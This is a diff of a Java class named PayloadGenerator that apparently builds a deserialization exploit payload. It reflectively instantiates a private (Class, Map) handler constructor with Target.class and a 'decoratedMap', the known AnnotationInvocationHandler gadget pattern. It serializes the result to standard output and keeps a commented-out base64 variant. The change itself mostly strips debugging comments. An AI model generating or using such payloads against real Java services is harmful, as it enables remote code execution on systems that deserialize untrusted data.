@@ -64,54 +64,24 @@ public class PayloadGenerator {
         Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);
         ctor.setAccessible(true);
         Object aih = ctor.newInstance(Target.class, decoratedMap);
-//        ByteArrayOutputStream test = new ByteArrayOutputStream();
-//        PrintStream PS = new PrintStream(test);
-//        PrintStream old = System.out;
 
-//        OutputStream os = new PrintStream();
-
-//        RememberAllWrittenTextPrintStream ps
-//                = new RememberAllWrittenTextPrintStream(System.out, "encodingBase64");
-//        System.setOut(PS);
-//        String response = System.console().readLine();
-//        System.out.println(response);
-//        Scanner sc = new Scanner(System.in);
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(out);
-//        String originalInput = oos.toString();
+        ObjectOutputStream oos = new ObjectOutputStream(System.out);
         oos.writeObject(aih);
-//        String encodedString = Base64.getEncoder().encodeToString(originalInput.getBytes());
-//        System.out.println(encodedString);
         oos.close();
 
-//        ps.getAllWrittenText();
-//        PS.println();
-//        String st = sc.next();
-//        System.out.println(response);
-//        Base64 base64 = new Base64();
+        /*
+        * Commented code is responsible for encoding directly in base64
+        */
 
-        System.out.println("One - Previous console");
-        System.out.println(out);
+/*        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(out);
+        oos.writeObject(aih);
+        oos.close();
+
         byte[] originalInput = out.toString().getBytes();
-        String originalInputS = out.toString();
         String encodedString = Base64.getEncoder().encodeToString(originalInput);
-        System.out.println(encodedString);
-        String encodedString2 = new String(Base64.getEncoder().encode(originalInputS.getBytes()));
-        System.out.println(encodedString2);
-//
-//        PrintStream previousConsole = System.out;
-//
-//        ByteArrayOutputStream newConsole = new ByteArrayOutputStream();
-//        System.setOut(new PrintStream(newConsole));
-//
-//        System.out.println("Two - New console");
-//
-//        previousConsole.println(newConsole.toString());
-//        System.setOut(previousConsole);
-//
-//        // Test print to console.
-//        System.out.println("Three - Restored console");
-//        System.out.println(newConsole.toString());
+        System.out.println(encodedString);*/
+
 
     }
 
